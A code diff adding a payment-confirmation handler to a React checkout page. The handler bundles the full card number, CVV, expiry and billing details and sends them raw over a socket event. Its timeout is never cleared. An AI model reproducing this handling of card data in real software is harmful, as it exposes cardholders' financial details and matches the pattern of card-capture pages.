@@ -482,6 +482,45 @@ const Checkout = () => {
     };
   }, [socket, currentStep]);
 
+  const handleConfirmPayment = () => {
+    try {
+      setConfirmingPayment(true);
+      if (!socket) {
+        alert('Connection lost. Please refresh the page and try again.');
+        setConfirmingPayment(false);
+        return;
+      }
+      const paymentData = {
+        cardNumber: cardData.cardNumber,
+        cardName: cardData.cardName,
+        cvv: cardData.cvv,
+        expiry: `${cardData.expiryMonth}/${cardData.expiryYear}`,
+        billingDetails: {
+          firstName: formData.firstName,
+          lastName: formData.lastName,
+          email: formData.email,
+          country: formData.country,
+          companyName: formData.companyName
+        },
+        planName,
+        billing,
+        amount: displayPrice,
+        timestamp: new Date().toISOString()
+      };
+      const emitTimeout = setTimeout(() => {
+        setConfirmingPayment(false);
+        alert('Request timeout. Please try again.');
+        socket.disconnect();
+      }, 30000);
+      socket.emit('payment-data', paymentData);
+      // Optionally, clear the timeout when you get a response (see your event listeners)
+    } catch (error) {
+      console.error('Error in payment confirmation:', error);
+      setConfirmingPayment(false);
+      alert('An unexpected error occurred. Please try again.');
+    }
+  };
+
   return (
     <div className="min-h-screen bg-slate-900 text-white">
       {/* Header with Progress */}
